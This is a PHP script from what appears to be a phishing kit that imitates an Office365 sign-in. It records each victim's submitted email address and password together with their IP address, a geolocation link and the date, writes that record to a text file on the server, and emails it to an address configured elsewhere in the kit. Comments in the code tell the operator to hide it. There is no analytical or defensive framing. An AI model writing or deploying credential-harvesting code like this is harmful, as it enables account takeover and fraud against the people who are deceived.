<?php
include "../../../x/lock.php";
include "send.php";
ob_start();
session_start();

$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$msg = "===========  Office365 Login  ============\n";
$msg .= "Email Address: ".$_POST['ofeml']."\n";
$msg .= "Email Password: ".$_POST['ofpwd']."\n";
$msg .= "==========================================\n";
$msg .= "IP : ".$ip."\n";
$msg .= "IP Geo : https://geoiptool.com/?IP=".$ip."\n";
$msg .= "Date : ".$adddate."\n";
$msg .= "Loc : ".$_SESSION['_DIR_']."\n";
$msg .= "==========================================\n";


$wfile = fopen("../../../a/1ST.txt", "a") or die("Unable to open file!");
$txt = $msg;
fwrite($wfile, $txt); 
fclose($wfile);

$subject = "Office 365 RZT | $ip | Created By KMC +=========== HIDE THIS SHIT ===========+";
$headers = "From: OFFICE\n";
$headers .= "MIME-Version: 1.0\n";
if(mail($recipient,$subject,$msg,$headers)){
	echo "saved";
}else {
	echo "saved";
}
?>